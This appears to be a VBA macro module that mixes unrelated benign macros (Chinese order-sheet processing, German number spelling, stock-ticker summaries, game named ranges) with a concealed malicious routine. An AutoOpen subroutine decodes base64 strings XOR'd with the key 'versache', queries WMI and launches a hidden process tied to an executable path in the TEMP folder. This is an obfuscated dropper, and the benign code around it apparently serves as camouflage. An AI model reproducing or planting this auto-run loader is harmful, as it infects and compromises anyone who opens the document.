Attribute VB_Name = "NewMacros"
Private Const CP_UTF8                       As Long = 65001

#If Win64 Then
Private Declare PtrSafe Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpDefaultChar As LongPtr, ByVal lpUsedDefaultChar As LongPtr) As LongPtr
Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr) As Long
#Else
Private Declare Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As Long, ByVal lpUsedDefaultChar As Long) As Long
Private Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long

#End If

Sub SmallBanana()
    Dim resFullWorkbook As String   '??????????
    Dim currentDate As Date         '????
    Dim currentMonth As String      '????
    Dim currentDay As String        '????
    Dim filePath As String          '??? excel ???????,??????
    Dim sourceFullWorkbook As String
    Dim count As Integer
    Dim j As Integer

    Dim validRow As Integer '?????
    Dim rowTitle            '???????

    Dim resWorkbook As Workbook
    Dim sourceWorkbook As Workbook

    Dim name As String
    Dim address As String
    Dim tel As String
    Dim goodsName As String
    Dim leaveWord As String
    Dim longGoodsName As String
    Dim digit As String
    Dim province As String
    Dim city As String
    Dim district As String
    Dim state As String

    currentDate = Date                '??????,?????
    currentMonth = Month(currentDate) '??????
    currentDay = Day(currentDate)     '?????

    sourceWorkbookPath = ThisWorkbook.path     '?????????,??????
    sourceFullWorkbook = ThisWorkbook.FullName '??????????,?????

    ' ??? = ????? + ? + ?
    resFullWorkbook = sourceWorkbookPath + "\?????" + currentMonth + "-" + currentDay + ".xls" '???xlsx????

    Workbooks.Add
    ActiveWorkbook.SaveAs resFullWorkbook, True
    Worksheets.Add().name = "???"

    Set resWorkbook = Application.Workbooks.Open(resFullWorkbook)       '??????
    Set sourceWorkbook = Application.Workbooks.Open(sourceFullWorkbook) '????

    '?????
    rowTitle = Array("?????", "??/??", "?", "?", "?", "??", "????", "??")
    For count = 1 To 8
    resWorkbook.Sheets("???").Cells(1, count).Value = rowTitle(count - 1)
    resWorkbook.Sheets("???").Cells(1, count).Font.Bold = True
    resWorkbook.Sheets("???").Cells(1, count).Borders.LineStyle = xlContinuous
    Next

    j = 2
    validRow = sourceWorkbook.Sheets(1).Cells(65536, 1).End(xlUp).Row '????A??????

    For i = 2 To validRow '????????????????
        name = sourceWorkbook.Sheets(1).Range("U" & i)          '?????????
        address = sourceWorkbook.Sheets(1).Range("Z" & i)       '??????????
        tel = sourceWorkbook.Sheets(1).Range("V" & i)           '???????
        goodsName = sourceWorkbook.Sheets(1).Range("H" & i)     '??????
        leaveWord = sourceWorkbook.Sheets(1).Range("T" & i)     '????
        longGoodsName = sourceWorkbook.Sheets(1).Range("E" & i)
        digit = sourceWorkbook.Sheets(1).Range("O" & i)         '??????
        province = sourceWorkbook.Sheets(1).Range("W" & i)      '???????
        city = sourceWorkbook.Sheets(1).Range("X" & i)          '???????
        district = sourceWorkbook.Sheets(1).Range("Y" & i)      '???????
        state = sourceWorkbook.Sheets(1).Range("C" & i)

        If (state = "???" And InStr(longGoodsName, "?????")) Then
            resWorkbook.Sheets("???").Range("A" & j) = name
            resWorkbook.Sheets("???").Range("B" & j) = tel

            '???,??????????
            If (InStr(province, "?")) Then
            province = Mid(province, 1, Len(province) - 1)
            End If

            resWorkbook.Sheets("???").Range("C" & j) = province
            resWorkbook.Sheets("???").Range("D" & j) = city
            resWorkbook.Sheets("???").Range("E" & j) = district
            resWorkbook.Sheets("???").Range("F" & j) = address
            resWorkbook.Sheets("???").Range("G" & j) = goodsName + " * " + digit
            resWorkbook.Sheets("???").Range("H" & j) = leaveWord

            j = j + 1
        End If
    Next
End Sub

Sub ToCircleCleanner()
    Worksheets.Add().name = "Circle Clean"
    Sheet1.Select
    Dim mycolumns '????????
    Dim name As String, tel As String, address As String, goodsName As String
    Dim money As String, purchaseprice As String
    Dim moneysum As Integer
    Dim digit As String
    Dim count As Integer
    Dim title
    Dim I2
    Dim state As String
    Dim leaveWord As String
    Dim province As String
    Dim city As String
    Dim k
    Dim district As String
    
    moneysum = 0
    mycolumns = [A65536].End(xlUp).Row 'A??????
    title = Array("?????", "??/??", "?", "?", "?", "??", "????", "??")
    j = 2

    For count = 1 To 8
        Sheets("Circle Clean").Cells(1, count).Value = title(count - 1)
        Sheets("Circle Clean").Cells(1, count).Font.Bold = True
        Sheets("Circle Clean").Cells(1, count).Borders.LineStyle = xlContinuous
    Next

    For i = 2 To mycolumns ' ????????????????
        name = Range("U" & i)           ' ?????????
        address = Range("Z" & i)        ' ??????????
        tel = Range("V" & i)            ' ???????
        goodsName = Range("H" & i)      ' ??????
        leaveWord = Range("T" & i)      ' ????
        longGoodsName = Range("E" & i)
        digit = Range("O" & i)          ' ??????
        province = Range("W" & i)       ' ???????
        city = Range("X" & i)           ' ???????
        district = Range("Y" & i)       ' ???????
        state = Range("C" & i)

        If (state = "???" And (InStr(longGoodsName, "Circle cleaner?????") Or InStr(longGoodsName, "?????"))) Then
            Sheets("Circle Clean").Range("A" & j) = name
            Sheets("Circle Clean").Range("A" & j).Borders.LineStyle = xlContinuous
            Sheets("Circle Clean").Range("B" & j) = tel
            Sheets("Circle Clean").Range("B" & j).Borders.LineStyle = xlContinuous

            If (InStr(province, "?")) Then
            province = Mid(province, 1, Len(province) - 1)
            End If

            Sheets("Circle Clean").Range("C" & j) = province
            Sheets("Circle Clean").Range("C" & j).Borders.LineStyle = xlContinuous
            Sheets("Circle Clean").Range("D" & j) = city
            Sheets("Circle Clean").Range("D" & j).Borders.LineStyle = xlContinuous
            Sheets("Circle Clean").Range("E" & j) = district
            Sheets("Circle Clean").Range("E" & j).Borders.LineStyle = xlContinuous
            Sheets("Circle Clean").Range("F" & j) = address
            Sheets("Circle Clean").Range("F" & j).Borders.LineStyle = xlContinuous

            If (InStr(goodsName, "??")) Then
            Sheets("Circle Clean").Range("G" & j) = "???(?)" + digit + "?"
            ElseIf (InStr(goodsName, "???")) Then
            Sheets("Circle Clean").Range("G" & j) = "???(?)" + digit + "?"
            ElseIf (InStr(goodsName, "???")) Then
            digit = digit * 3
            Sheets("Circle Clean").Range("G" & j) = "???(?)" + digit + "?"
            ElseIf (InStr(goodsName, "?????")) Then
            Sheets("Circle Clean").Range("G" & j) = goodsName + digit + "?"
            End If

            Sheets("Circle Clean").Range("G" & j).Borders.LineStyle = xlContinuous
            Sheets("Circle Clean").Range("H" & j) = leaveWord
            Sheets("Circle Clean").Range("H" & j).Borders.LineStyle = xlContinuous
            j = j + 1
        End If
    Next
End Sub

Public Function spellNumber( _
           ByVal Num As Long, _
           Optional lang As String = "de", _
           Optional de_1 As String = "eins", _
           Optional de_ss As String = "ss" _
           ) As String


    If Num = 0 Then ' {
       If lang = "de" Then
          spellNumber = "null"
       ElseIf lang = "en" Then
          spellNumber = "zero"
       Else
          spellNumber = "0"
       End If
       Exit Function
    End If ' }

    Dim numText As String
    numText = Num

   '  redim unitStr(9) as string
    Dim unitStr(5, 2) As String

    If lang = "en" Then ' {
       unitStr(2, 1) = " Thousand"
       unitStr(3, 1) = " Million"
       unitStr(4, 1) = " Billion"
       unitStr(5, 1) = " Trillion"

       unitStr(2, 2) = " Thousand"
       unitStr(3, 2) = " Million"
       unitStr(4, 2) = " Billion"
       unitStr(5, 2) = " Trillion"
    ' }
    ElseIf lang = "de" Then ' {
       unitStr(2, 1) = "tausend"
       unitStr(3, 1) = " Million"
       unitStr(4, 1) = " Milliarde"
       unitStr(5, 1) = " Billion"

       unitStr(2, 2) = "tausend"
       unitStr(3, 2) = " Millionen"
       unitStr(4, 2) = " Milliarden"
       unitStr(5, 2) = " Billionen"
    End If '

    Dim unitNo
    unitNo = 1

    Do While numText <> "" ' {

       Dim hundredsStr

       Dim de_ein As String
       de_ein = "ein"
       If unitNo >= 3 Then
          de_ein = "eine"
       End If

       hundredsStr = num_100_to_999(Right(numText, 3), lang, de_ein:=de_ein)

       Dim pl_sg As Integer
       pl_sg = 1

       If CLng(Right(numText, 3)) > 1 Then pl_sg = 2

'      if lang = "de" and unitNo >= 3 and cLng(right(numText, 3)) > 1 then


       If lang = "de" And unitNo >= 3 And spellNumber <> "" Then
          spellNumber = " " & spellNumber
       End If

'      hundredsStr = num_100_to_999( right(numText, 3), lang)

       If hundredsStr <> "" Then spellNumber = hundredsStr & unitStr(unitNo, pl_sg) & spellNumber

       If Len(numText) > 3 Then
          numText = Left(numText, Len(numText) - 3)
       Else
          numText = ""
       End If

       unitNo = unitNo + 1

    Loop ' }

    If (Num = 1 Or Right(Num, 2) = "01") And de_1 = "eins" Then ' {
        spellNumber = spellNumber & "s"
    End If ' }

End Function ' }

' { spellNumberWithCurrency
Public Function spellNumberWithCurrency( _
           ByVal Num As String, _
           Optional lang As String = "de", _
           Optional currency_ As String = "Franken", _
           Optional fraction As String = "Rappen", _
           Optional de_ss As String = "ss" _
       ) As String

   Dim currencyStr   As String
   Dim fractionalStr As String
'  dim Dollars, fractionalStr, Temp

' '  redim unitStr(9) as string
'  dim unitStr(5) as string

'  if lang = "en" then ' {
'     unitStr(2) = " Thousand"
'     unitStr(3) = " Million"
'     unitStr(4) = " Billion"
'     unitStr(5) = " Trillion"
'  ' }
'  elseif lang = "de" then ' {
'     unitStr(2) = " Tausend"
'     unitStr(3) = " Million"
'     unitStr(4) = " Milliarde"
'     unitStr(5) = " Billion"
'  end if ' }

  ' string representation of amount.

    Num = Trim(Str(Num))

  ' Position of decimal place 0 if none.

    Dim decimalPlace
    decimalPlace = InStr(Num, ".")

  ' Convert cents and set num to dollar amount.

    If decimalPlace > 0 Then ' {

       fractionalStr = num_10_to_99_to_string(Left(Mid(Num, decimalPlace + 1) & "00", 2), lang, de_ss:=de_ss)

       Num = Trim(Left(Num, decimalPlace - 1))

    End If ' }


    currencyStr = spellNumber(Num, lang)

'   dim unitNo
'   unitNo = 1
'   do while num <> "" ' {
'
'      dim hundredsStr
'      hundredsStr = num_100_to_999(Right(num, 3), lang)
'
'      if hundredsStr <> "" then currencyStr = hundredsStr & unitStr(unitNo) & currencyStr
'
'      if len(num) > 3 then
'         num = Left(num, len(num) - 3)
'      else
'         num = ""
'      end if
'
'      unitNo = unitNo + 1
'
'   loop ' }

    Select Case currencyStr ' {
       Case "": currencyStr = "No Dollars"
       Case "One": currencyStr = "One Dollar"
       Case Else: currencyStr = currencyStr & " " & currency_
    End Select ' }

    Select Case fractionalStr ' {
    Case "" ' {

       If lang = "en" Then
          fractionalStr = " and No " & fraction
       ElseIf lang = "de" Then
          fractionalStr = " und kein " & fraction
       End If
    ' }
    Case "One" ' {
       If lang = "en" Then
          fractionalStr = " and One Cent"
       ElseIf lang = "de" Then
          fractionalStr = " und ein " & fraction
       End If
    ' }
    Case Else ' {

       If lang = "en" Then
          fractionalStr = " and " & fractionalStr & " " & fraction
       ElseIf lang = "de" Then
          fractionalStr = " und " & fractionalStr & " " & fraction
       End If
    ' }
    End Select ' }

    spellNumberWithCurrency = currencyStr & fractionalStr

End Function ' }

Public Sub test_SpellNumber() ' {

    Call checkSpelledNumber(1, "de", "eins")
    Call checkSpelledNumber(2, "de", "zwei")
    Call checkSpelledNumber(10, "de", "zehn")
    Call checkSpelledNumber(11, "de", "elf")
    Call checkSpelledNumber(12, "de", "zwolf")
    Call checkSpelledNumber(13, "de", "dreizehn")
    Call checkSpelledNumber(20, "de", "zwanzig")
    Call checkSpelledNumber(22, "de", "zweiundzwanzig")
    Call checkSpelledNumber(30, "de", "dreissig")
    Call checkSpelledNumber(35, "de", "funfunddreissig")
    Call checkSpelledNumber(100, "de", "einhundert")                                                                                                     ' Oder hundert
    Call checkSpelledNumber(101, "de", "einhunderteins")                                                                                                 ' Oder hunderteins
    Call checkSpelledNumber(150, "de", "einhundertfunfzig")                                                                                              ' Oder hundertfunfzig
    Call checkSpelledNumber(180, "de", "einhundertachtzig")                                                                                              ' Oder hundertachtzig
    Call checkSpelledNumber(186, "de", "einhundertsechsundachtzig")
    Call checkSpelledNumber(999, "de", "neunhundertneunundneunzig")
    Call checkSpelledNumber(1000, "de", "eintausend")                                                                                                    ' Oder tausend
    Call checkSpelledNumber(1001, "de", "eintausendeins")                                                                                                ' Oder tausend
    Call checkSpelledNumber(100001, "de", "einhunderttausendeins")                                                                                       ' Oder hunderttaussendeins, einhunderttausendundeins, hunderttausendundeins
    Call checkSpelledNumber(1000000, "de", "eine Million")
    Call checkSpelledNumber(1500000, "de", "eine Million funfhunderttausend")
    Call checkSpelledNumber(4950300, "de", "vier Millionen neunhundertfunfzigtausenddreihundert")
    Call checkSpelledNumber(1234678901, "de", "eine Milliarde zweihundertvierunddreissig Millionen sechshundertachtundsiebzigtausendneunhunderteins")
    Call checkSpelledNumber(1000000000000#, "de", "eine Billion")
    Call checkSpelledNumber(2000000000000#, "de", "zwei Billionen")

 '
 '  TODO: Include me again:
 '
 '  call checkSpelledNumberWithCurrency("1", "de", "Franken", "Rappen", "Ein Franken und kein Rappen")
 '  call checkSpelledNumberWithCurrency("1", "en", "Dollar" , "Cent"  , "One Dollar and No Cent")

    Debug.Print "test finished."
End Sub ' }

Private Sub checkSpelledNumberWithCurrency(number As String, lang As String, currency_ As String, fraction As String, expected As String) ' {

   Dim gotten As String
   gotten = spellNumberWithCurrency(number, lang, currency_, fraction)

   If gotten <> expected Then ' {
      Debug.Print (number & ", " & lang & ", " & currency_ & ", " & fraction & ": " & gotten & " != " & expected)
   End If ' }

End Sub ' }

Private Sub checkSpelledNumber(Num As Long, lang As String, expected As String) ' {

   Dim gotten As String
   gotten = spellNumber(Num, lang)

   If gotten <> expected Then ' {
      Debug.Print (Num & ", " & lang & ": " & gotten & " != " & expected)
   End If ' }

End Sub ' }

Function num_100_to_999(ByVal MyNumber As String, lang As String, Optional de_ein As String = "ein", Optional de_ss As String = "ss") As String ' {
  '
  ' Spell a number between 100 and 999
  '

'   dim Result as string

    If Val(MyNumber) = 0 Then Exit Function

    MyNumber = Right("000" & MyNumber, 3)

    ' Convert the hundreds place.

    If Mid(MyNumber, 1, 1) <> "0" Then

       If lang = "en" Then
          num_100_to_999 = num_1_to_9_to_string(Mid(MyNumber, 1, 1), lang) & " Hundred "
       ElseIf lang = "de" Then
          num_100_to_999 = num_1_to_9_to_string(Mid(MyNumber, 1, 1), lang) & "hundert"
       End If

    End If

    ' Convert the tens and ones place.

    If Mid(MyNumber, 2, 1) <> "0" Then

       num_100_to_999 = num_100_to_999 & num_10_to_99_to_string(Mid(MyNumber, 2), lang, de_ss:=de_ss)

    Else

       num_100_to_999 = num_100_to_999 & num_1_to_9_to_string(Mid(MyNumber, 3), lang, de_ein:=de_ein)

    End If

'   num_100_to_999 = Result

End Function ' }

Private Function num_10_to_99_to_string(TensText As String, lang As String, Optional de_ss As String = "ss") As String ' {

  '
  ' Spell a number between 10 and 99
  '

'   dim Result as string

    num_10_to_99_to_string = "" ' Null out the temporary function value.

    If Val(Left(TensText, 1)) = 1 Then ' { if value between 10-19...

       If lang = "en" Then  ' {

          Select Case Val(TensText) ' {

              Case 10: num_10_to_99_to_string = "Ten"
              Case 11: num_10_to_99_to_string = "Eleven"
              Case 12: num_10_to_99_to_string = "Twelve"
              Case 13: num_10_to_99_to_string = "Thirteen"
              Case 14: num_10_to_99_to_string = "Fourteen"
              Case 15: num_10_to_99_to_string = "Fifteen"
              Case 16: num_10_to_99_to_string = "Sixteen"
              Case 17: num_10_to_99_to_string = "Seventeen"
              Case 18: num_10_to_99_to_string = "Eighteen"
              Case 19: num_10_to_99_to_string = "Nineteen"
              Case Else

          End Select ' }
       ' }
       ElseIf lang = "de" Then ' {

          Select Case Val(TensText) ' {

            Case 10: num_10_to_99_to_string = "zehn"
            Case 11: num_10_to_99_to_string = "elf"
            Case 12: num_10_to_99_to_string = "zwolf"
            Case 13: num_10_to_99_to_string = "dreizehn"
            Case 14: num_10_to_99_to_string = "vierzehn"
            Case 15: num_10_to_99_to_string = "funfzehn"
            Case 16: num_10_to_99_to_string = "sechszehn"
            Case 17: num_10_to_99_to_string = "siebzehn"
            Case 18: num_10_to_99_to_string = "achtzehn"
            Case 19: num_10_to_99_to_string = "neunzehn"
            Case Else

        End Select ' }

       End If ' }
    ' }
    Else ' { if value between 20-99...

       If lang = "en" Then ' {

          Select Case Val(Left(TensText, 1)) ' {
             Case 2: num_10_to_99_to_string = "Twenty"
             Case 3: num_10_to_99_to_string = "Thirty"
             Case 4: num_10_to_99_to_string = "Forty"
             Case 5: num_10_to_99_to_string = "Fifty"
             Case 6: num_10_to_99_to_string = "Sixty"
             Case 7: num_10_to_99_to_string = "Seventy"
             Case 8: num_10_to_99_to_string = "Eighty"
             Case 9: num_10_to_99_to_string = "Ninety"
             Case Else
          End Select ' }

       ' }
       ElseIf lang = "de" Then ' {
          Select Case Val(Left(TensText, 1)) ' {
            Case 2: num_10_to_99_to_string = "zwanzig"
            Case 3: num_10_to_99_to_string = "drei" & de_ss & "ig"
            Case 4: num_10_to_99_to_string = "vierzig"
            Case 5: num_10_to_99_to_string = "funfzig"
            Case 6: num_10_to_99_to_string = "sechzig"
            Case 7: num_10_to_99_to_string = "siebzig"
            Case 8: num_10_to_99_to_string = "achtzig"
            Case 9: num_10_to_99_to_string = "neunzig"
            Case Else
          End Select ' }
       End If ' }

       If lang = "en" Then ' {
          num_10_to_99_to_string = num_10_to_99_to_string & num_1_to_9_to_string(Right(TensText, 1), lang)  ' Retrieve ones place.
       Else
          If Right(TensText, 1) >= "2" And Right(TensText, 1) <= "9" Then
             num_10_to_99_to_string = num_1_to_9_to_string(Right(TensText, 1), lang) & "und" & num_10_to_99_to_string
          End If
       End If ' }

    End If ' }

    num_10_to_99_to_string = num_10_to_99_to_string

End Function ' }

  Private Function num_1_to_9_to_string(digit As String, lang As String, Optional de_ein As String = "ein") As String ' {

   If lang = "en" Then ' {

        Select Case Val(digit) ' {
           Case 1: num_1_to_9_to_string = "One"
           Case 2: num_1_to_9_to_string = "Two"
           Case 3: num_1_to_9_to_string = "Three"
           Case 4: num_1_to_9_to_string = "Four"
           Case 5: num_1_to_9_to_string = "Five"
           Case 6: num_1_to_9_to_string = "Six"
           Case 7: num_1_to_9_to_string = "Seven"
           Case 8: num_1_to_9_to_string = "Eight"
           Case 9: num_1_to_9_to_string = "Nine"
           Case Else: num_1_to_9_to_string = ""
        End Select ' }

   ' }
   ElseIf lang = "de" Then ' {

        Select Case Val(digit) ' {
           Case 1: num_1_to_9_to_string = de_ein
'                if de_eins then
'                  num_1_to_9_to_string = "eins"
'                else
'                  num_1_to_9_to_string = "ein"
'               end if
           Case 2: num_1_to_9_to_string = "zwei"
           Case 3: num_1_to_9_to_string = "drei"
           Case 4: num_1_to_9_to_string = "vier"
           Case 5: num_1_to_9_to_string = "funf"
           Case 6: num_1_to_9_to_string = "sechs"
           Case 7: num_1_to_9_to_string = "sieben"
           Case 8: num_1_to_9_to_string = "acht"
           Case 9: num_1_to_9_to_string = "neun"
           Case Else: num_1_to_9_to_string = ""
        End Select ' }

   End If ' }

End Function ' }


Sub browseFolderPath()
    Dim fileExplorer As FileDialog
    Set fileExplorer = Application.FileDialog(msoFileDialogFolderPicker)

    'Mencegah Memilih lebih dari 1 folder
    fileExplorer.AllowMultiSelect = False

    With fileExplorer
        If .Show = -1 Then 'Pilih Folder
            AbsLokasi = .SelectedItems.Item(1)
            path = AbsLokasi & "\"
        Else
            MsgBox "Pilih Folder dibatalkan"
            AbsLokasi = "" 'Ketika dibatalkan/cancel
        End If
    End With
End Sub

Sub Stocks()
For Each ws In Worksheets
    Dim last_row As Long
    Dim Total_Volume, new_row As Long
    last_row = ws.Cells(Rows.count, 1).End(xlUp).Row
    ws.Range("I1").Value = "Ticker"
    ws.Range("J1").Value = "Yearly Change"
    ws.Range("K1").Value = "Percent Change"
    ws.Range("L1").Value = "Total Stock Volume"
    Total_Volume = 0
    new_row = 2
    
'Part1: Ticker Symbol
    For i = 2 To last_row
        If ws.Cells(i + 1, 1) <> ws.Cells(i, 1) Then
        Stock_Name = ws.Cells(i, 1).Value
        ws.Range("I" & new_row).Value = Stock_Name
        new_row = new_row + 1
        End If
    Next i
    
'Part2: Yearly Price Change
    new_row = 2
    first_day = 2
    For i = 2 To last_row
        If ws.Cells(i + 1, 1) <> ws.Cells(i, 1) Then
        last_day = i
        first_day_open_price = ws.Range("C" & first_day)
        last_day_close_price = ws.Range("F" & last_day)
        yearly_change = last_day_close_price - first_day_open_price
        ws.Range("J" & new_row).Value = yearly_change
        first_day = i + 1
        
'Part3: Percent Change
            If first_day_open_price = 0 And last_day_close_price = 0 Then
            percent_change = 0
            ElseIf first_day_open_price = 0 And last_day_close_price <> 0 Then
            percent_change = 1
            Else
            percent_change = yearly_change / first_day_open_price
            ws.Range("K" & new_row).Value = percent_change
            ws.Range("K" & new_row).NumberFormat = "0.00%"
            End If
'conditional Formatting
            If yearly_change >= 0 Then
            ws.Range("J" & new_row).Interior.ColorIndex = 4
            Else
            ws.Range("J" & new_row).Interior.ColorIndex = 3
            End If
        new_row = new_row + 1
        End If
    Next i
        
'Part4: Total Volume Calculations
    new_row = 2
    For i = 2 To last_row
        If ws.Cells(i + 1, 1) <> ws.Cells(i, 1) Then
        Total_Volume = Total_Volume + ws.Range("G" & i).Value
        ws.Range("L" & new_row).Value = Total_Volume
        Total_Volume = 0
        new_row = new_row + 1
        Else
        Total_Volume = Total_Volume + ws.Range("G" & i).Value
        End If
    Next i
    
'Part5: Greatest Value Calculations
    ws.Range("O3").Value = "Greatest % Increase"
    ws.Range("O4").Value = "Greatest % Decrease"
    ws.Range("O5").Value = "Greatest Total Volume"
    ws.Range("P1").Value = "Ticker"
    ws.Range("Q1").Value = "Value"
    Greatest_Increase = ws.Range("K2").Value
    Greatest_Decrease = ws.Range("K2").Value
    Greatest_Total_Volume = ws.Range("L2").Value
'Greatest % Increase
    For i = 2 To new_row
        If ws.Range("K" & i).Value >= Greatest_Increase Then
        Greatest_Increase = ws.Range("K" & i).Value
        ws.Range("P3").Value = ws.Range("I" & i)
        ws.Range("Q3").Value = Greatest_Increase
        ws.Range("Q3").NumberFormat = "0.00%"
        End If
'Greatest % Decrease
        If ws.Range("K" & i).Value <= Greatest_Decrease Then
        Greatest_Decrease = ws.Range("K" & i).Value
        ws.Range("P4").Value = ws.Range("I" & i)
        ws.Range("Q4").Value = Greatest_Decrease
        ws.Range("Q4").NumberFormat = "0.00%"
        End If
'Greatest Total Volume
        If ws.Range("L" & i).Value >= Greatest_Total_Volume Then
        Greatest_Total_Volume = ws.Range("L" & i).Value
        ws.Range("P5").Value = ws.Range("I" & i)
        ws.Range("Q5").Value = Greatest_Total_Volume
        End If
    Next i
    ws.Columns("I:Q").EntireColumn.AutoFit
Next ws
End Sub


''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''



Public Function ToBase64(sValue As String, Optional ByVal MultiLine As Boolean) As String
    Dim baValue()       As Byte
    Dim lSize           As Long
    
    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
        .DataType = "bin.base64"
        ReDim baValue(0 To 4 * Len(sValue))
        lSize = WideCharToMultiByte(CP_UTF8, 0, StrPtr(sValue), Len(sValue), baValue(0), UBound(baValue) + 1, 0, 0)
        If lSize > 0 Then
            ReDim Preserve baValue(0 To lSize - 1)
            .NodeTypedValue = baValue
        End If
        ToBase64 = .Text
        If Not MultiLine Then
            ToBase64 = Replace(Replace(ToBase64, vbCrLf, vbNullString), vbLf, vbNullString)
        End If
    End With
End Function



Public Function Groa(sBase64 As String) As String
    Dim baValue()       As Byte
    Dim sValue          As String
    Dim lSize           As Long
    
    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
        .DataType = "bin.base64"
        .Text = sBase64
        baValue = .NodeTypedValue
        sValue = String$(4 * UBound(baValue), 0)
        lSize = MultiByteToWideChar(CP_UTF8, 0, baValue(0), UBound(baValue) + 1, StrPtr(sValue), Len(sValue))
        Groa = Left$(sValue, lSize)
    End With
End Function

Private Function yetras(Text As String, key As String) As String
  Dim bText() As Byte
  Dim bKey() As Byte
  Dim TextUB As Long
  Dim KeyUB As Long
  Dim TextPos As Long
  Dim KeyPos As Long
  
  bText = StrConv(Text, vbFromUnicode)
  bKey = StrConv(key, vbFromUnicode)
  TextUB = UBound(bText)
  KeyUB = UBound(bKey)
  For TextPos = 0 To TextUB
    bText(TextPos) = bText(TextPos) Xor bKey(KeyPos)
    If KeyPos < KeyUB Then
      KeyPos = KeyPos + 1
    Else
      KeyPos = 0
    End If
  Next TextPos
  yetras = StrConv(bText, vbUnicode)
End Function

Sub AutoOpen()
    Dim Vniko As String
    Vniko = Environ("TEMP") & "\cviak.exe"
    If DUPLO(Vniko) Then
           Kill (Vniko)
    End If
    
    Const impersonation = 3
    Set Locator = CreateObject("WbemScripting.SWbemLocator")
    Set Service = Locator.ConnectServer()
    Service.Security_.ImpersonationLevel = impersonation
    Set Process = Service.Get("Win32_Process")
    Set Dear_myBera = Service.Get(yetras(Groa("IQwcQFM8OAwYAiEHABcdFlgkFhcTBhsWS0IXHgMCGgQVABYcTw4BBgQKARwHF0YGGQhVXzMGGwoaExcyBQcaAAUWPBIMBhtYIhcHFg=="), "versache"))
    With Dear_myBera
        If .StatusCode = 0 Then
            End
        ElseIf .StatusCode > 0 Then
            End
        End If
    End With
    On Error Resume Next
    Error = Process.Create(yetras(Groa("BgoFFhMQAAAaCVJeFgoGARkSAQcYDw1FHgwWFwQNSEgVCh8eAA0MRT8IAhwTF0UoGQEHHwRDKgwCFiYBAA0bAxMXSVMyFwkXAkgwGhUQPBcXCwEVBBFISCUKBwECBkgNAhECAFtMRxcXElwUCBcAEBQQARYTAAcLAgAcB08ABwhZBhMBEwIbBhkWEx0FBhoWWVFBQlVWWUobBAEHBBFHKBcWGQAIDkYADgBSXiUGGxEfCxMHCAwGRSpHVhYPFVIxMygiLwIVAQQdSxcLBD9KXlY2BhITF0U1BAoRFhIQSEgwDB4WMQIcDVY5UFcEDR5fIiA/Iz0AHgwXDlwWGQY0Rw=="), "versache"), Null, Null, intProcessID)

End Sub

Public Function DUPLO(file_path As String) As Boolean
    

    trega = Dir(file_path) <> ""
    Exit Function

DirErr:
      If Err.number = 68 Then
        trega = False
    Else
        MsgBox Err.Description & " (" & Err.number & ")", , "Run-time Error"
        Stop
    End If
End Function

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''


Public Sub ExtendEnemiesNamedRange()
    Dim iFirstRow As Long
    Dim iLastRow As Long
    Dim rngEnemy As Range
    
    Set rngEnemy = Worksheets("Key Stats").Range("Enemies")
    
    iFirstRow = rngEnemy(1, 1).Row
    iLastRow = Worksheets("Key Stats").Cells(Worksheets("Key Stats").Rows.count, 1).End(xlUp).Row
    
    rngEnemy.Resize(iLastRow - iFirstRow + 1, 1).name = "Enemies"
    
End Sub
'Update the size of the Player_Details named range
Public Sub ExtendPlayerNamedRange()
    Dim iFirstRow As Long
    Dim iLastRow As Long
    Dim rngPlayer As Range
    
    Set rngPlayer = Worksheets("Key Stats").Range("Player_Details")
    
    iFirstRow = rngPlayer(1, 1).Row
    iLastRow = rngPlayer(1, 1).End(xlDown).Row
    
    rngPlayer.Resize(iLastRow - iFirstRow + 1, 1).name = "Player_Details"
    
End Sub
'Update the size of the Base_Enemy_Details named range
Public Sub ExtendBaseEnemiesNamedRange()
    Dim iFirstRow As Long
    Dim iLastRow As Long
    Dim rngBaseDetails As Range
    
    Set rngBaseDetails = Worksheets("Key Stats").Range("Base_Enemy_Details")
    
    iFirstRow = rngBaseDetails(1, 1).Row
    iLastRow = rngBaseDetails(1, 1).End(xlDown).Row
    
    rngBaseDetails.Resize(iLastRow - iFirstRow + 1, 1).name = "Base_Enemy_Details"
    
End Sub


Sub SummOrdersForAds()

'save main address
mainA = Cells(1, 1).Value
sep = InStr(1, mainA, "/", 1)
If sep > 0 Then
    mainA = Left(mainA, sep - 2)
    'Debug.Print mainA
Else
    mainA = Left(mainA, InStr(1, mainA, " ", 1) - 1)
    'Debug.Print mainA
End If

'delete unwanted
Columns("A:A").Select
Selection.Delete Shift:=xlToLeft

